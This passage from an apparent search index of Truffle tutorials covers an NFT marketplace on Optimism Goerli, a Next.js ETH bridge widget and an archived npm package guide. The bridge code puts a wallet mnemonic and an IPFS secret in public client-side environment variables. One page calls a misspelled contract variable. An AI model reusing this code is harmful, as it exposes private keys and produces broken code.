) { return LISTING_FEE ; } function getListedNfts () public view returns ( NFT [] memory ) { uint256 nftCount = _nftCount . current (); uint256 unsoldNftsCount = nftCount - _nftsSold . current (); NFT [] memory nfts = new NFT []( unsoldNftsCount ); uint nftsIndex = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. listed ) { nfts [ nftsIndex ] = _idToNFT [ i + 1 ]; nftsIndex ++ ; } } return nfts ; } function getMyNfts () public view returns ( NFT [] memory ) { uint nftCount = _nftCount . current (); uint myNftCount = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. owner == msg . sender ) { myNftCount ++ ; } } NFT [] memory nfts = new NFT []( myNftCount ); uint nftsIndex = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. owner == msg . sender ) { nfts [ nftsIndex ] = _idToNFT [ i + 1 ]; nftsIndex ++ ; } } return nfts ; } function getMyListedNfts () public view returns ( NFT [] memory ) { uint nftCount = _nftCount . current (); uint myListedNftCount = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. seller == msg . sender && _idToNFT [ i + 1 ]. listed ) { myListedNftCount ++ ; } } NFT [] memory nfts = new NFT []( myListedNftCount ); uint nftsIndex = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. seller == msg . sender && _idToNFT [ i + 1 ]. listed ) { nfts [ nftsIndex ] = _idToNFT [ i + 1 ]; nftsIndex ++ ; } } return nfts ; } }", "title": "Create an NFT and Marketplace smart contract"}, {"location": "guides/optimism-bridge-widget/#modify-truffle-configovmjs", "text": "Now that we want to reference our new Optimsim contracts in the client, we need to change the build path in truffle-config.ovm.js to add the contract ABIs into a folder in client . Modify the build directory in truffle-config.ovm.js as follows: contracts_build_directory : \"../client/contracts/optimism-contracts\" ,", "title": "Modify truffle-config.ovm.js"}, {"location": "guides/optimism-bridge-widget/#migrate-the-new-optimism-contracts", "text": "Now, let's deploy the newly created Optimism contracts. To do so, create a migrations file 1_deploy_contracts.js . Then populate as so: var OptimismNFT = artifacts . require ( \"OptimismNFT\" ); var OptimismMarketplace = artifacts . require ( \"OptimismMarketplace\" ); module . exports = async function ( deployer ) { await deployer . deploy ( OptimismMarketplace ); const marketplace = await OptimismMarketplace . deployed (); await deployer . deploy ( OptimismNFT , marketplace . address ); } Since we are only deploying these two contracts, which are both on Optimism, let's deploy using Truffle Dashboard! First, let's add the Optimism Goerli network to our MetaMask wallet. You should add this network information to your MetaMask wallet: Network name : Optimism Goerli New RPC URL : https://optimism-goerli.infura.io/v3/ Chain ID : 420 Currency Symbol : ETH Block explorer URL : https://blockscout.com/optimism/goerli/ Now, to migrate your contracts first start up dashboard on localhost:24012 : truffle dashboard Make sure the Optimism Goerli network is selected on MetaMask. Then simply call: truffle migrate --config truffle-config.ovm.js --network dashboard Truffle dashboard will ask you sign to transactions: one for deploying OptimismMarketplace and one for deploying OptimismNFT . You should be able to see the built contracts in client/contract/optimism-contracts . At this point, you should test the contracts. We won't be going over it in this tutorial, but you can follow the instructions here . Now, let's get into the client portion!", "title": "Migrate the new Optimism contracts"}, {"location": "guides/optimism-bridge-widget/#create-an-infura-ipfs-project", "text": "You'll need Infura IPFS account and dedicated gateway to upload your NFT metadata. To create a IPFS project, select create IPFS project. Then, you'll need to create a unique gateway name. In this project, we'll call it optimism-demo . You will need to give your own dedicated gateway with its own unique name.", "title": "Create an Infura IPFS project"}, {"location": "guides/optimism-bridge-widget/#create-marketplace-frontend-pages", "text": "Again, we'll just be using the frontend from our previous tutorial. If you want to do a deeper dive, read this section. Otherwise, to add the front end you'll need to: Install some packages to get our client up and running: cd ../client npm install axios npm install web3modal npm install web3 npm install ipfs-http-client Then, we need to create or edit 6 files that sit under client/pages :", "title": "Create Marketplace frontend pages"}, {"location": "guides/optimism-bridge-widget/#_appjs", "text": "This file organizes the link routing Code import '../styles/globals.css' import Link from 'next/link' function MyApp ({ Component , pageProps }) { return ( < div > < nav className = \"border-b p-6\" > < p className = \"text-4xl font-bold\" > Optimism Marketplace < /p> < div className = \"flex mt-4\" > < Link href = \"/\" > < a className = \"mr-4 text-teal-400\" > Home < /a> < /Link> < Link href = \"/create-and-list-nft\" > < a className = \"mr-6 text-teal-400\" > Sell a new NFT < /a> < /Link> < Link href = \"/my-nfts\" > < a className = \"mr-6 text-teal-400\" > My NFTs < /a> < /Link> < Link href = \"/my-listed-nfts\" > < a className = \"mr-6 text-teal-400\" > My Listed NFTs < /a> < /Link> < /div> < /nav> < Component {... pageProps } /> < /div> ) } export default MyApp", "title": "_app.js"}, {"location": "guides/optimism-bridge-widget/#indexjs", "text": "Thie file is the Home tab, where a user can see and buy all of the listed NFTs. Code import Web3 from 'web3' ; import Web3Modal from 'web3modal' ; import { useEffect , useState } from 'react' ; import axios from 'axios' ; import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' export default function Home () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () // Get all listed NFTs const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) const listings = await marketPlaceContract . methods . getListedNfts (). call () // Iterate over the listed NFTs and retrieve their metadata const nfts = await Promise . all ( listings . map ( async ( i ) => { try { const optimismNFTContract = new web3 . eth . Contract ( OptimismNFT . abi , OptimismNFT . networks [ networkId ]. address ) const tokenURI = await optimismNFTContract . methods . tokenURI ( i . tokenId ). call () const meta = await axios . get ( tokenURI ) const nft = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . buyer , image : meta . data . image , name : meta . data . name , description : meta . data . description , } return nft } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } async function buyNft ( nft ) { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId (); const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ); const accounts = await web3 . eth . getAccounts (); await marketPlaceContract . methods . buyNft ( OptimismNFT . networks [ networkId ]. address , nft . tokenId ). send ({ from : accounts [ 0 ], value : nft . price }); loadNFTs () } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"px-20 py-10 text-3xl\" > No NFTs available !< /h1>) } else { return ( < div className = \"flex justify-center\" > < div className = \"px-4\" style = { { maxWidth : '1600px' } } > < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } /> < div className = \"p-4\" > < p style = { { height : '64px' } } className = \"text-2xl font-semibold\" > { nft . name } < /p> < div style = { { height : '70px' , overflow : 'hidden' } } > < p className = \"text-gray-400\" > { nft . description } < /p> < /div> < /div> < div className = \"p-4 bg-teal-300\" > < p className = \"text-2xl font-bold text-white\" > { Web3 . utils . fromWei ( nft . price , \"ether\" )} ETH < /p> < button className = \"mt-4 w-full bg-teal-400 text-white font-bold py-2 px-12 rounded\" onClick = {() => buyNft ( nft )} > Buy < /button> < /div> < /div> )) } < /div> < /div> < /div> ) } }", "title": "index.js"}, {"location": "guides/optimism-bridge-widget/#create-and-list-nftjs", "text": "This is the Sell tab, where a user can create and list an NFT. Make sure you replace with the dedicated gateway name you create in your IPFS project on Infura. You'll also need to add in your IPFS API and Secret to create our IPFS client. To do so, create .env.local in your client folder. Then, populate it with these values: NEXT_PUBLIC_IPFS_SECRET = NEXT_PUBLIC_IPFS_KEY = NEXT_PUBLIC_IPFS_UNIQUE_SUBDOMAIN = Don't forget to add .env.local to your .gitignore ! Then, copy paste this code into create-and-list-nft.js : Code import { useState } from 'react' import Web3 from 'web3' import Web3Modal from 'web3modal' import { useRouter } from 'next/router' import { create as ipfsHttpClient } from 'ipfs-http-client' import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' const projectId = process . env [ \"NEXT_PUBLIC_IPFS_KEY\" ]; const projectSecret = process . env [ \"NEXT_PUBLIC_IPFS_SECRET\" ]; const auth = 'Basic ' + Buffer . from ( projectId + ':' + projectSecret ). toString ( 'base64' ); const client = ipfsHttpClient ({ host : 'ipfs.infura.io' , port : 5001 , protocol : 'https' , headers : { authorization : auth , }, }); const IPFSGateway = `https:// ${ process . env [ \"NEXT_PUBLIC_IPFS_UNIQUE_SUBDOMAIN\" ] } .infura-ipfs.io/ipfs/` export default function CreateItem () { const [ fileUrl , setFileUrl ] = useState ( null ) const [ formInput , updateFormInput ] = useState ({ price : '' , name : '' , description : '' }) const router = useRouter () async function onChange ( e ) { // upload image to IPFS const file = e . target . files [ 0 ] try { const added = await client . add ( file , { progress : ( prog ) => console . log ( `received: ${ prog } ` ) } ) const url = ` ${ IPFSGateway }${ added . path } ` setFileUrl ( url ) } catch ( error ) { console . log ( 'Error uploading file: ' , error ) } } async function uploadToIPFS () { const { name , description , price } = formInput if ( ! name || ! description || ! price || ! fileUrl ) { return } else { // first, upload metadata to IPFS const data = JSON . stringify ({ name , description , image : fileUrl }) try { const added = await client . add ( data ) console . log ( 'added: ' , added ) const url = ` ${ IPFSGateway }${ added . path } ` // after metadata is uploaded to IPFS, return the URL to use it in the transaction return url } catch ( error ) { console . log ( 'Error uploading file: ' , error ) } } } async function listNFTForSale () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const url = await uploadToIPFS () const networkId = await web3 . eth . net . getId () // Mint the NFT const optimismNFTContractAddress = OptimismNFT . networks [ networkId ]. address const optimismNFTContract = new web3 . eth . Contract ( OptimismNFT . abi , optimismNFTContractAddress ) const accounts = await web3 . eth . getAccounts () const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) let listingFee = await marketPlaceContract . methods . getListingFee (). call () listingFee = listingFee . toString () optimismNFTontract . methods . mint ( url ). send ({ from : accounts [ 0 ] }). on ( 'receipt' , function ( receipt ) { console . log ( 'minted' ); // List the NFT const tokenId = receipt . events . NFTMinted . returnValues [ 0 ]; marketPlaceContract . methods . listNft ( optimismNFTContractAddress , tokenId , Web3 . utils . toWei ( formInput . price , \"ether\" )) . send ({ from : accounts [ 0 ], value : listingFee }). on ( 'receipt' , function () { console . log ( 'listed' ) router . push ( '/' ) }); }); } return ( < div className = \"flex justify-center\" > < div className = \"w-1/2 flex flex-col pb-12\" > < input placeholder = \"Asset Name\" className = \"focus:outline-none focus:ring-teal-400 focus:border-teal-400 mt-8 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , name : e . target . value })} /> < textarea placeholder = \"Asset Description\" className = \"focus:outline-none focus:ring-teal-400 focus:border-teal-400 mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , description : e . target . value })} /> < input placeholder = \"Asset Price in Eth\" className = \"focus:outline-none focus:ring-teal-400 focus:border-teal-400 mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , price : e . target . value })} /> < input type = \"file\" name = \"Asset\" className = \"my-4\" onChange = { onChange } /> { fileUrl && ( < img className = \"rounded mt-4\" width = \"350\" src = { fileUrl } /> ) } < button onClick = { listNFTForSale } className = \"focus:ring-teal-400 focus:border-teal-400 font-bold mt-4 bg-teal-400 text-white rounded p-4 shadow-lg\" > Mint and list NFT < /button> < /div> < /div> ) }", "title": "create-and-list-nft.js"}, {"location": "guides/optimism-bridge-widget/#my-nftsjs", "text": "This is the My NFTs tab, where the user can see the NFTs they own and choose to resell. Code import Web3 from 'web3' ; import { useEffect , useState } from 'react' import axios from 'axios' import Web3Modal from 'web3modal' import { useRouter } from 'next/router' import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' ; import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' ; export default function MyAssets () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) const router = useRouter () useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) const optimismNFTContractAddress = OptimismNFT . networks [ networkId ]. address const optimismNFTContract = new web3 . eth . Contract ( OptimismNFT . abi , optimismNFTContractAddress ) const accounts = await web3 . eth . getAccounts () const data = await marketPlaceContract . methods . getMyNfts (). call ({ from : accounts [ 0 ]}) const nfts = await Promise . all ( data . map ( async i => { try { const tokenURI = await optimismNFTContract . methods . tokenURI ( i . tokenId ). call () const meta = await axios . get ( tokenURI ) let nft = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . buyer , image : meta . data . image , name : meta . data . name , description : meta . data . description , tokenURI : tokenURI } return nft } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } function listNFT ( nft ) { router . push ( `/resell-nft?id= ${ nft . tokenId } &tokenURI= ${ nft . tokenURI } ` ) } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"py-10 px-20 text-3xl\" > No NFTs owned < /h1>); } else { return ( < div className = \"flex justify-center\" > < div className = \"p-4\" > < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } className = \"rounded\" /> < div className = \"p-4\" > < p style = { { height : '64px' } } className = \"text-2xl font-semibold\" > { nft . name } < /p> < div style = { { height : '70px' , overflow : 'hidden' } } > < p className = \"text-gray-400\" > { nft . description } < /p> < /div> < /div> < div className = \"p-4 bg-teal-300\" > < p className = \"text-2xl font-bold text-white\" > Price - { Web3 . utils . fromWei ( nft . price , \"ether\" )} Eth < /p> < button className = \"mt-4 w-full bg-teal-400 text-white font-bold py-2 px-12 rounded\" onClick = {() => listNFT ( nft )} > List < /button> < /div> < /div> )) } < /div> < /div> < /div> ); } }", "title": "my-nfts.js"}, {"location": "guides/optimism-bridge-widget/#resell-nftjs", "text": "This is the page the user is directed to to resell their NFTs. Code import { useEffect , useState } from 'react' import Web3 from 'web3' import { useRouter } from 'next/router' import axios from 'axios' import Web3Modal from 'web3modal' import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' export default function ResellNFT () { const [ formInput , updateFormInput ] = useState ({ price : '' , image : '' }) const router = useRouter () const { id , tokenURI } = router . query const { image , price } = formInput useEffect (() => { fetchNFT () }, [ id ]) async function fetchNFT () { if ( ! tokenURI ) { return } else { const meta = await axios . get ( tokenURI ) updateFormInput ( state => ({ ... state , image : meta . data . image })) } } async function listNFTForSale () { if ( ! price ) { return } else { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) let listingFee = await marketPlaceContract . methods . getListingFee (). call () listingFee = listingFee . toString () const accounts = await web3 . eth . getAccounts () marketPlaceContract . methods . resellNft ( OptimismNFT . networks [ networkId ]. address , id , Web3 . utils . toWei ( formInput . price , \"ether\" )) . send ({ from : accounts [ 0 ], value : listingFee }). on ( 'receipt' , function () { router . push ( '/' ) }); } } return ( < div className = \"flex justify-center\" > < div className = \"w-1/2 flex flex-col pb-12\" > < input placeholder = \"Asset Price in Eth\" className = \"mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , price : e . target . value })} /> { image && ( < img className = \"rounded mt-4\" width = \"350\" src = { image } /> ) } < button onClick = { listNFTForSale } className = \"font-bold mt-4 bg-teal-400 text-white rounded p-4 shadow-lg\" > List NFT < /button> < /div> < /div> ) }", "title": "resell-nft.js"}, {"location": "guides/optimism-bridge-widget/#my-listed-nftsjs", "text": "Code This is the My Listed NFTs tab, where users can see what NFTs they have listed for sale. import Web3 from 'web3' ; import { useEffect , useState } from 'react' ; import axios from 'axios' ; import Web3Modal from 'web3modal' ; import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' ; import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' ; export default function CreatorDashboard () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () // Get listed NFTs const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) const accounts = await web3 . eth . getAccounts () const listings = await marketPlaceContract . methods . getMyListedNfts (). call ({ from : accounts [ 0 ]}) // Iterate over my listed NFTs and retrieve their metadata const nfts = await Promise . all ( listings . map ( async i => { try { const optimismNFTContract = new web3 . eth . Contract ( OptimismNFT . abi , OptimismNFT . networks [ networkId ]. address ) const tokenURI = await optimismNFTContract . methods . tokenURI ( i . tokenId ). call (); const meta = await axios . get ( tokenURI ); let item = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . owner , image : meta . data . image , } return item } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"py-10 px-20 text-3xl\" > No NFTs listed < /h1>) } else { return ( < div > < div className = \"p-4\" > < h2 className = \"text-2xl py-2\" > Items Listed < /h2> < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } className = \"rounded\" /> < div className = \"p-4 bg-teal-300\" > < p className = \"text-2xl font-bold text-white\" > Price - { Web3 . utils . fromWei ( nft . price , \"ether\" )} Eth < /p> < /div> < /div> )) } < /div> < /div> < /div> ) } }", "title": "my-listed-nfts.js"}, {"location": "guides/optimism-bridge-widget/#add-bridge-widget", "text": "Now, let's create a new page under pages called goerli-bridge.js . We'll need some additional packages: npm i react-async-hook npm i @eth-optimism/sdk npm i ethers Now, we'll need to add our infura key and goerli mnemonic to the .env.local file as well: NEXT_PUBLIC_INFURA_KEY = NEXT_PUBLIC_GOERLI_MNEMONIC = Add the following code to goerli-bridge.js : Code import { useRef , useEffect } from \"react\" ; import { useAsyncCallback } from 'react-async-hook' ; const optimismSDK = require ( \"@eth-optimism/sdk\" ); const ethers = require ( \"ethers\" ); const goerliMnemonic = process . env [ \"NEXT_PUBLIC_GOERLI_MNEMONIC\" ]; const infuraKey = process . env [ \"NEXT_PUBLIC_INFURA_KEY\" ]; const l1Url = \"https://goerli.infura.io/v3/\" + infuraKey ; const l2Url = \"https://optimism-goerli.infura.io/v3/\" + infuraKey ; // getSigners // Initializes ethers providers and returns wallets. const l1RpcProvider = new ethers . providers . JsonRpcProvider ( l1Url ); const l2RpcProvider = new ethers . providers . JsonRpcProvider ( l2Url ); const hdNode = ethers . utils . HDNode . fromMnemonic ( goerliMnemonic ); const privateKey = hdNode . derivePath ( ethers . utils . defaultPath ). privateKey ; const [ l1Signer , l2Signer ] = [ new ethers . Wallet ( privateKey , l1RpcProvider ), new ethers . Wallet ( privateKey , l2RpcProvider ) ]; // Initializes Optimism SDK's Cross Chain Messenger const crossChainMessenger = new optimismSDK . CrossChainMessenger ({ l1ChainId : 5 , // Goerli value, 1 for mainnet l2ChainId : 420 , // Goerli value, 10 for mainnet l1SignerOrProvider : l1Signer , l2SignerOrProvider : l2Signer }); const getL1Eth = async () => { console . log ( \"getL1Eth\" ); return ethers . utils . formatEther ( ( await crossChainMessenger . l1Signer . getBalance ()) . toString () ); }; const getL2Eth = async () => { console . log ( \"getL2Eth\" ); return ethers . utils . formatEther ( ( await crossChainMessenger . l2Signer . getBalance ()) . toString () ); }; const Bridge = () => { const l1Balance = useAsyncCallback ( getL1Eth , []); const l2Balance = useAsyncCallback ( getL2Eth , []); const depositRef = useRef ( null ); const withdrawRef = useRef ( null ); useEffect (() => { l1Balance . execute (); l2Balance . execute (); }, [ l1Balance . execute , l2Balance . execute ]); const withdrawEth = async () => { console . log ( \"Withdraw ETH\" ); const start = new Date (); const response = await crossChainMessenger . withdrawETH ( ethers . utils . parseEther ( withdrawRef . current . value )); console . log ( `Transaction hash (on L2): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to IN_CHALLENGE_PERIOD\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . IN_CHALLENGE_PERIOD ); console . log ( \"In the challenge period, waiting for status READY_FOR_RELAY\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . READY_FOR_RELAY ); console . log ( \"Ready for relay, finalizing message now\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . finalizeMessage ( response ); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response , optimismSDK . MessageStatus . RELAYED ); console . log ( `withdrawETH took ${ ( new Date () - start ) / 1000 } seconds\\n\\n\\n` ); l1Balance . execute (); l2Balance . execute (); }; const depositEth = async () => { console . log ( \"Deposit ETH\" ); const start = new Date (); const response = await crossChainMessenger . depositETH ( ethers . utils . parseEther ( depositRef . current . value )); console . log ( `Transaction hash (on L1): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . RELAYED ); console . log ( `depositETH took ${ ( new Date () - start ) / 1000 } seconds\\n\\n` ); l1Balance . execute (); l2Balance . execute (); }; return ( < div className = \"py-8 px-8 m-8 max-w-md mx-auto bg-white rounded-xl shadow-lg space-y-2 sm:py-4 sm:flex sm:items-center sm:space-y-0 sm:space-x-6\" > < div className = \"text-center space-y-2 sm:text-left\" > < div className = \"space-y-0.5\" >< /div> < div > < div className = \"txt-lg font-bold\" > Bridge your ETH !< /div> < /div> < div className = \"my-4 space-y-4\" > < input placeholder = \"ETH bridged to Optimism\" ref = { depositRef } type = \"text\" className = \"focus:outline-none bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-teal-400 focus:border-teal-400 block w-full p-2.5\" /> < button onClick = { depositEth } className = \"px-4 py-1 text-sm text-teal-400 font-semibold rounded-lg border border-teal-400 hover:text-white hover:bg-teal-400 hover:border-transparent\" > Deposit < /button> { l1Balance . loading && < div > Loading Goerli Eth Balance ... < /div>} { l1Balance . error && < div className = \"font-semibold\" > Error : { l1Balance . error . message } < /div>} { l1Balance . result && ( < div > < span className = \"text-slate-500\" > Current Goerli Eth Balance : < /span> < span className = \"font-semibold\" > { l1Balance . result } < /span> < /div> ) } < input placeholder = \"ETH bridged to Ethereum\" ref = { withdrawRef } type = \"text\" className = \"focus:outline-none bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-teal-400 focus:border-teal-400 block w-full p-2.5\" /> < button onClick = { withdrawEth } className = \"px-4 py-1 text-sm text-teal-400 font-semibold rounded-lg border border-teal-400 hover:text-white hover:bg-teal-400 hover:border-transparent\" > Withdraw < /button> { l2Balance . loading && < div > Loading Optimism Goerli Eth Balance ... < /div>} { l2Balance . error && < div className = \"font-semibold\" > Error : { l2Balance . error . message } < /div>} { l2Balance . result && ( < div > < span className = \"text-slate-500\" > Current Optimism Goerli Eth Balance : < /span> < span className = \"font-semibold\" > { l2Balance . result } < /span> < /div> ) } < /div> < /div> < /div> ); } export default Bridge ; The things to note here is that we effectively copy pasted the relevant depositETH and withdrawETH content from scripts/goerli_bridge_value.js . There are a few key differences though, namely: We split reportBalances into getL1Eth and getL2Eth to be displayed on our web page. We needed to convert the input values for withdraw and deposit from text to BigNumber ( ethers.utils.parseEther(withdrawRef.current.value) and ethers.utils.parseEther(depositRef.current.value) ) Finally, the last piece is to make sure we add this page to our list of pages in _app.js ! To the end of the links, add: < Link href = \"/goerli-bridge\" > < a className = \"mr-6 text-teal-400\" > Goerli Bridge < /a> < /Link> Now, everything should be hooked up! Run npm run dev from the client folder and try it out!", "title": "Add bridge widget"}, {"location": "guides/optimism-bridge-widget/#future-extensions", "text": "And there you have it! You've created a Marketplace DApp on Optimism and embedded an ETH bridge into the UI. It is important to note that we only covered bridging ETH on Goerli. Possible extensions include allowing the user to choose the desired network, or bridging other ERC20 tokens. Alternatively, consider creating a chat bot, that incorporates our Greeter contracts for sending messages. If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future Extensions"}, {"location": "guides/package-management/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! This is a beta document and refers to the beta version of Truffle. The following features will not work unless you are using Truffle Beta. Get the Beta Version \u00b6 As this feature is in beta, you must first get the beta version of Truffle. To make sure the beta version doesn't conflict with the released version, first remove the Truffle version you have currently installed: $ npm uninstall -g truffle And then install the beta version: $ npm install -g truffle@beta Overview \u00b6 Truffle Beta comes standard with npm integration, and is aware of the node_modules directory in your project if it exists. This means you can use and distribute contracts, dapps and Ethereum-enabled libraries via npm , making your code available to others and other's code available to you. Package Layout \u00b6 Projects created with Truffle have a specific layout by default which enables them to be used as packages. This layout isn't required, but if used as a common convention -- or \"de-facto standard\" -- then distributing contracts and dapps through package management will become much easier. The most important directories in a Truffle package are the following: /contracts /build (which includes /build/contracts , created by Truffle) The first directory is your contracts directory, which includes your raw Solidity contracts. The second directory is the build directory, and more specifically /build/contracts , which holds build artifacts in the form of .sol.js files. Including raw contracts in your package will allow others to import those contracts within their own solidity code. Similarly, including your .sol.js build artifacts in your package will allow others to seamlessly interact with your contracts from Javascript, which can be used in dapps, scripts and migrations. Using a Package \u00b6 When using a package within your own project, it is important to note that there are two places where you might be interested in using other's contract code: within your contracts ( .sol files) and within your Javascript code ( .sol.js files). The following provides an example of each case, and discusses techniques for making the most of other's contracts and build artifacts. Installing \u00b6 For this example, we're going to use the Example Truffle Library , which provides a simple name registry that is deployed to the Morden test network. In order to use it as a dependency, we must first install it within our project through npm : $ cd my_project $ npm install example-truffle-library Note that the last command above downloads the package and places it in my_project/node_modules directory, which is important for the examples below. See the npm documentation for help using npm to install packages. Within Your Contracts \u00b6 To use a package's contracts within your contracts, this can be as simple as Solidity's import statement. When your import path isn't explicitly relative or absolute, this signifies to Truffle that you're looking for a file from a specific named package. Consider this example using the Example Truffle Library mentioned above: import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; Since the path didn't start with ./ , Truffle knows to look in your project's node_modules directory for the example-truffle-library folder. From there, it resolves the path to provide you the contract you requested. Within Javascript Code \u00b6 To interact with package's contracts within Javascript code, you simply need to require that package's .sol.js files like so: var SimpleNameRegistry = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.sol.js\" ); These files are provided by EtherPudding , which Truffle uses internally. See EtherPudding's documentation for more information. Package's Deployed Addresses \u00b6 Sometimes you want your contracts to interact with the package's previously deployed contracts. Since the deployed addresses exist within the package's .sol.js files, you must perform an extra step to get those addresses into your contracts. To do so, make your contract accept the address of the dependency contract, and then use migrations. The following is an example contract that exists within your project as well as an example migration: Contract: MyContract.sol import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; contract MyContract { SimpleNameRegistry registry ; address public owner ; function MyContract { owner = msg.sender ; } // Simple example that uses the deployed registry from the package. function getModule ( bytes32 name ) returns ( address ) { return registry . names ( name ); } // Set the registry if you're the owner. function setRegistry ( address addr ) { require ( msg.sender == owner ); registry = SimpleNameRegistry ( addr ); } } Migration: 3_hook_up_example_library.js var SimpleNameRegistry = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.sol.js\" ); module . exports = function ( deployer ) { // Deploy our contract, then set the address of the registry. deployer . deploy ( MyContract ). then ( function () { MyContract . deployed (). setRegistry ( SimpleNameRegistry . address ); }); }; Recommendation: Use the TestRPC \u00b6 **Update**: Since this tutorial was published, we have released [Ganache](/ganache) a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our [Ganache Quickstart](/docs/ganache/quickstart) page. The ethereumjs-testrpc is wildly useful for packages that were previously deployed to the live network. The TestRPC includes a --fork feature which allows you to fork from the main chain while developing your application. What this means for you is that you can develop and test against packages that are deployed live, using real data , without having to worry about deploying your dependency's contracts yourself. The Future: Where do we go from here? \u00b6 Node's npm is, of course, a centralized service, and the packages that exist there are on a centralized network. As Ethereum becomes more widespread, so will the urge to decentralize all of our tools and packages. The ideal package management system for Ethereum is one where the package registry exists on the live chain and the package data exists on a decentralized file storage network like IPFS or Swarm; 